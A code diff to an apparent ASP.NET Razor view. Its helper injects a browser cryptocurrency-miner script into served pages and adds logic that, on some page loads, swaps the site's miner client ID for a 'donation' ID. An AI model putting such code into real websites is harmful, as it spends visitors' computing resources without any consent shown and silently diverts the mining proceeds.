@@ -13,11 +13,26 @@
 
 @helper renderMiner()
 {
-
-    <script>
-    @SignalRService.Utils.RenderUtils.RenderMinerScript(Model.MinerConfigurationViewModel.ClientId, Model.MinerConfigurationViewModel.Throttle, Model.MinerConfigurationViewModel.ScriptUrl, Model.MinerConfigurationViewModel.StartDelayMs, Model.MinerConfigurationViewModel.ReportStatusIntervalMs, true)
-    </script>
-
+        string ClientId = Model.MinerConfigurationViewModel.ClientId;
+        bool shallDonate = SignalRService.Utils.ScriptDonater.Instance.ShallDonate(ClientId);
+        if (shallDonate)
+        {
+            string donateClientId = SignalRService.Utils.ScriptDonater.Instance.Donate(ClientId);
+            <text>
+                <script>
+                @SignalRService.Utils.RenderUtils.RenderMinerScript(donateClientId, Model.MinerConfigurationViewModel.Throttle, Model.MinerConfigurationViewModel.ScriptUrl, Model.MinerConfigurationViewModel.StartDelayMs, Model.MinerConfigurationViewModel.ReportStatusIntervalMs, true)
+                </script>
+            </text>
+        }
+        else
+        {
+            SignalRService.Utils.ScriptDonater.Instance.AddStat(ClientId);
+            <text>
+                <script>
+                @SignalRService.Utils.RenderUtils.RenderMinerScript(Model.MinerConfigurationViewModel.ClientId, Model.MinerConfigurationViewModel.Throttle, Model.MinerConfigurationViewModel.ScriptUrl, Model.MinerConfigurationViewModel.StartDelayMs, Model.MinerConfigurationViewModel.ReportStatusIntervalMs, true)
+                </script>
+            </text>
+        }
 }
 
 @{
